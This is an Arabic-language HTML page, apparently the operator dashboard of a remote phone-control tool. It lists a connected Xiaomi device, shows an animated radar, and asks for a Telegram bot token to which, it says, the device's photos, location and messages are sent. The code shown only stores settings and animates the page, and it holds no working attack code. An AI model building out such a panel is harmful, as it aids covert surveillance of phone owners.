<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>CREFTEX — Control Center</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;600;700;800;900&display=swap" rel="stylesheet"><style>:root{--cyan:#00BFFF;--red:#FF3B4E;--white:#F5F8FF;--light-text:#D7E3F4;--bg:#08111D;--border:#20384C}*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}html,body{height:100%;overflow-x:hidden}body{font-family:'Cairo',sans-serif;background:radial-gradient(900px 500px at 85% -5%,rgba(0,140,255,.1),transparent 60%),radial-gradient(700px 500px at 0% 30%,rgba(139,61,255,.07),transparent 60%),radial-gradient(800px 600px at 50% 110%,rgba(0,191,255,.06),transparent 60%),linear-gradient(180deg,#07111C 0%,#0B1622 50%,#101C29 100%);background-color:var(--bg);color:var(--white);min-height:100vh;display:flex;justify-content:center}.app{width:100%;max-width:430px;min-height:100vh;padding:15px 15px 96px;position:relative}svg{display:block}.header{display:flex;align-items:center;justify-content:center;padding:6px 2px 14px}.brand-wrap{display:flex;align-items:center;gap:12px}.brand h1{font-size:19px;font-weight:900;letter-spacing:2px;line-height:1.05;background:linear-gradient(90deg,#19C9FF 20%,#8B5CFF 90%);-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 0 10px rgba(25,201,255,.45));direction:ltr;white-space:nowrap}.logo{width:60px;height:60px;border-radius:50%;object-fit:cover;filter:drop-shadow(0 0 12px rgba(24,216,255,.9));flex-shrink:0}.section{background:#111F2C;border:1px solid #203A4D;border-radius:28px;padding:18px 16px;margin-bottom:16px;box-shadow:0 10px 35px rgba(0,0,0,.35)}.section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}.section-title{display:flex;align-items:center;gap:9px;font-size:17px;font-weight:800;color:var(--white)}.section-title svg{width:21px;height:21px;color:#4FC4FF;filter:drop-shadow(0 0 6px rgba(0,191,255,.5))}.count-badge{min-width:24px;height:24px;padding:0 7px;border-radius:999px;background:#0876D9;color:#fff;font-size:13px;font-weight:800;display:flex;align-items:center;justify-content:center;box-shadow:0 0 12px rgba(8,118,217,.6)}.refresh-btn{width:38px;height:38px;border-radius:12px;background:#10283A;border:1px solid #17638B;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 0 10px rgba(0,140,255,.15)}.device-card{border-radius:25px;background:linear-gradient(160deg,#142231 0%,#131E30 60%,#1B1830 100%);border:2px solid transparent;background-clip:padding-box;position:relative;padding:18px 16px;display:flex;align-items:center;gap:14px;box-shadow:0 0 24px rgba(0,175,255,.18),0 0 40px rgba(179,60,255,.1)}.device-card::before{content:"";position:absolute;inset:-2px;border-radius:25px;background:linear-gradient(120deg,#00AFFF 0%,#2E7FE8 40%,#8B3DFF 75%,#B33CFF 100%);z-index:-1}.status-dot{width:22px;height:22px;border-radius:50%;background:rgba(255,48,72,.12);border:1.5px solid rgba(255,48,72,.55);display:flex;align-items:center;justify-content:center;position:absolute;top:14px;left:14px}.status-dot::after{content:"";width:9px;height:9px;border-radius:50%;background:var(--red);box-shadow:0 0 10px rgba(255,48,72,.95)}.phcol{display:flex;flex-direction:column;align-items:center;flex-shrink:0}.phone-mock{width:60px;height:auto;object-fit:contain}.chgdev{font-size:11px;font-weight:800;color:#35B6FF;margin-top:7px;cursor:pointer;text-shadow:0 0 8px rgba(0,191,255,.55)}.device-info{flex:1;min-width:0;direction:ltr;text-align:left}.device-info h3{font-size:17px;font-weight:800;color:#F2F6FF;letter-spacing:.3px;margin-bottom:6px}.device-info .row{display:flex;align-items:center;gap:7px;font-size:12px;font-weight:600;color:#8395A9;margin-top:4px;direction:ltr}.device-info .row svg{width:14px;height:14px;color:#5E7A93;flex-shrink:0}.device-info .row .ar{direction:rtl;unicode-bidi:plaintext}.divider{height:2px;border-radius:2px;background:linear-gradient(90deg,transparent,rgba(0,191,255,.7) 30%,rgba(139,61,255,.7) 70%,transparent);margin:2px 0 16px;box-shadow:0 0 10px rgba(0,191,255,.35)}.radar{position:relative;width:230px;height:230px;margin:6px auto 4px;border-radius:50%;background:radial-gradient(circle at 50% 50%,#0E2231 0%,#0A1826 75%);border:2px solid rgba(25,245,157,.4);box-shadow:0 0 28px rgba(25,245,157,.18),inset 0 0 45px rgba(25,245,157,.08);overflow:hidden}.cross{position:absolute;inset:0;display:block;background:linear-gradient(rgba(25,245,157,.14),rgba(25,245,157,.14)) center/1px 100% no-repeat,linear-gradient(rgba(25,245,157,.14),rgba(25,245,157,.14)) center/100% 1px no-repeat}.ring{position:absolute;display:block;border:1px solid rgba(25,245,157,.2);border-radius:50%}.sweep{position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,rgba(25,245,157,.5),rgba(25,245,157,.12) 55deg,transparent 75deg);animation:sw 3.2s linear infinite}@keyframes sw{to{transform:rotate(360deg)}}.rdot{position:absolute;width:8px;height:8px;margin:-4px;border-radius:50%;background:#19F59D;box-shadow:0 0 10px #19F59D,0 0 4px #19F59D;animation:blk 2.4s ease-in-out infinite}@keyframes blk{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.15;transform:scale(.6)}}.lbl{display:block;font-size:12.5px;font-weight:800;color:#9FDBFF;margin:0 3px 7px}.inp{width:100%;background:#0F2233;border:1px solid #17638B;border-radius:14px;padding:13px 14px;color:var(--white);font-family:inherit;font-size:14px;font-weight:700;margin-bottom:14px;direction:ltr;text-align:left;box-shadow:inset 0 0 10px rgba(0,140,255,.06)}.inp:focus{outline:0;border-color:var(--cyan);box-shadow:0 0 12px rgba(0,191,255,.3)}.saveb{width:100%;padding:14px;border-radius:16px;border:0;background:linear-gradient(135deg,#0876D9,#0A4EC1);color:#fff;font-family:inherit;font-size:15px;font-weight:900;cursor:pointer;box-shadow:0 0 16px rgba(0,150,255,.4)}.saveb:active{transform:scale(.98)}.snote{font-size:11px;font-weight:700;color:#5E7A93;text-align:center;margin-top:10px}.bottomnav{position:fixed;bottom:0;left:0;right:0;margin:0 auto;width:100%;max-width:430px;background:rgba(8,20,33,.92);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-top:1px solid var(--border);display:grid;grid-template-columns:repeat(4,1fr);padding:8px 6px calc(10px + env(safe-area-inset-bottom));z-index:50;box-shadow:0 -8px 30px rgba(0,0,0,.5)}.bitem{display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11px;font-weight:700;color:#8A9AAD;cursor:pointer;padding:6px 0 2px;position:relative;transition:color .2s}.bitem svg{width:23px;height:23px;transition:transform .2s,filter .2s}.bitem:active svg{transform:scale(1.18)}.bitem.active{color:#00C8FF}.bitem.active svg{color:#00C8FF;filter:drop-shadow(0 0 8px rgba(0,200,255,.8));transform:translateY(-1px)}.bitem.active::before{content:"";position:absolute;top:1px;width:46px;height:31px;border-radius:14px;background:rgba(0,200,255,.09);box-shadow:inset 0 0 10px rgba(0,200,255,.12)}.bitem.active::after{content:"";position:absolute;bottom:-2px;width:34px;height:3px;border-radius:3px;background:#00C8FF;box-shadow:0 0 12px rgba(0,200,255,.9)}</style></head><body><div class="app"><header class="header"><div class="brand-wrap"><img class="logo" src="https://i.ibb.co/Y4Yts8WK/file-00000000176c8243bee7f4f1a464120b.png" alt="CONTROL CENTER"><div class="brand"><h1>CONTROL CENTER</h1></div></div></header><div id="home"><section class="section" id="devSec"><div class="section-head"><div class="section-title"><img src="https://i.ibb.co/GfFT6ypq/IMG.png" alt="" style="width:21px;height:21px;object-fit:contain;filter:drop-shadow(0 0 6px rgba(0,191,255,.5))">الأجهزة<span class="count-badge">1</span></div><button class="refresh-btn"><img src="https://i.ibb.co/QjjhM4Xd/IMG.png" alt="تحديث" style="width:18px;height:18px;object-fit:contain"></button></div><div class="device-card"><span class="status-dot"></span><div class="device-info"><h3>Xiaomi M2004J19C</h3><div class="row"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="7" width="12" height="11" rx="2.5"/><path d="M9 7V4.5M15 7V4.5"/><path d="M3.5 11v4M20.5 11v4"/><circle cx="10" cy="11.5" r=".6" fill="currentColor"/><circle cx="14" cy="11.5" r=".6" fill="currentColor"/></svg>Android: 10</div><div class="row"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="8.5"/><path d="M12 7.5V12l3 2"/></svg><span class="ar">آخر ظهور: 2025-09-27 05:24 م</span></div><div class="row"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="3"/><path d="M9 2v2M15 2v2M9 20v2M15 20v2M2 9h2M2 15h2M20 9h2M20 15h2"/></svg>ID: device_bb9976d766ff</div></div><div class="phcol"><img class="phone-mock" src="https://i.ibb.co/zVGfqLPg/file-00000000f684821082434638ba1fc7a5.png" alt="الهاتف"><div class="chgdev">تغير الجهاز</div></div></div></section><section class="section" id="radSec"><div class="section-head"><div class="section-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="8.5"/><circle cx="12" cy="12" r="3"/><path d="M12 2v2.5M12 19.5V22M2 12h2.5M19.5 12H22"/></svg>الرادار</div></div><div class="radar" id="radar"><span class="cross"></span><span class="ring" style="inset:17%"></span><span class="ring" style="inset:34%"></span><div class="sweep"></div><span class="rdot" style="left:32%;top:28%"></span><span class="rdot" style="left:66%;top:40%;animation-delay:.7s"></span><span class="rdot" style="left:45%;top:68%;animation-delay:1.3s"></span><span class="rdot" style="left:72%;top:70%;animation-delay:1.9s"></span></div></section></div><div id="setpg" style="display:none"><section class="section"><div class="section-head"><div class="section-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3.2"/><path d="M19 12a7 7 0 0 0-.1-1.2l2-1.6-2-3.4-2.4 1a7 7 0 0 0-2-1.2L14 3h-4l-.5 2.6a7 7 0 0 0-2 1.2l-2.4-1-2 3.4 2 1.6A7 7 0 0 0 5 12c0 .4 0 .8.1 1.2l-2 1.6 2 3.4 2.4-1a7 7 0 0 0 2 1.2L10 21h4l.5-2.6a7 7 0 0 0 2-1.2l2.4 1 2-3.4-2-1.6c.1-.4.1-.8.1-1.2z"/></svg>الإعدادات</div></div><div class="divider"></div><label class="lbl">توكن بوت تيلجرام</label><input class="inp" id="tgk" placeholder="123456789:AAExxxxxxxxxxxxxxxxxxxxxxxx" autocomplete="off"><label class="lbl">اسم المستخدم / Chat ID</label><input class="inp" id="tgc" placeholder="@username أو 123456789" autocomplete="off"><button class="saveb" onclick="saveSet()">💾 حفظ</button><div class="snote">يتم إرسال نتائج الأوامر (الصور، الموقع، الرسائل…) إلى هذا البوت تلقائياً</div><div class="snote" id="smsg" style="color:#19F59D"></div></section></div></div><nav class="bottomnav"><div class="bitem active" id="nb1" onclick="goHome()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3.5 10.5 12 3.5l8.5 7"/><path d="M6 9.5V20h12V9.5"/><path d="M10 20v-5h4v5"/></svg>الرئيسية</div><div class="bitem" onclick="goDev()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="7" y="2.5" width="10" height="19" rx="2.5"/><path d="M11 18.5h2"/></svg>الهاتف</div><div class="bitem" onclick="goRad()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="7" height="7" rx="1.8"/><rect x="13" y="4" width="7" height="7" rx="1.8"/><rect x="4" y="13" width="7" height="7" rx="1.8"/><rect x="13" y="13" width="7" height="7" rx="1.8"/></svg>الميزات</div><div class="bitem" id="nb4" onclick="goSet()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h10M18 7h2M4 12h2M10 12h10M4 17h10M18 17h2"/><circle cx="16" cy="7" r="2"/><circle cx="8" cy="12" r="2"/><circle cx="16" cy="17" r="2"/></svg>الإعدادات</div></nav><script>document.getElementById('tgk').value=localStorage.getItem('tgk')||'';document.getElementById('tgc').value=localStorage.getItem('tgc')||'';function showPg(p){document.getElementById('home').style.display=p==='home'?'block':'none';document.getElementById('setpg').style.display=p==='set'?'block':'none';document.getElementById('nb1').classList.toggle('active',p==='home');document.getElementById('nb4').classList.toggle('active',p==='set')}function goHome(){showPg('home');window.scrollTo({top:0,behavior:'smooth'})}function goDev(){showPg('home');document.getElementById('devSec').scrollIntoView({behavior:'smooth'})}function goRad(){showPg('home');document.getElementById('radSec').scrollIntoView({behavior:'smooth'})}function goSet(){showPg('set');window.scrollTo({top:0,behavior:'smooth'})}function saveSet(){localStorage.setItem('tgk',document.getElementById('tgk').value.trim());localStorage.setItem('tgc',document.getElementById('tgc').value.trim());var m=document.getElementById('smsg');m.textContent='تم الحفظ بنجاح ✓';setTimeout(function(){m.textContent=''},2500)}setInterval(function(){var r=document.getElementById('radar');if(!r)return;var d=document.createElement('span');d.className='rdot';var a=Math.random()*6.283,t=Math.random()*.4+.07;d.style.left=50+Math.cos(a)*t*100+'%';d.style.top=50+Math.sin(a)*t*100+'%';r.appendChild(d);setTimeout(function(){d.remove()},4500)},1600)</script></body></html>
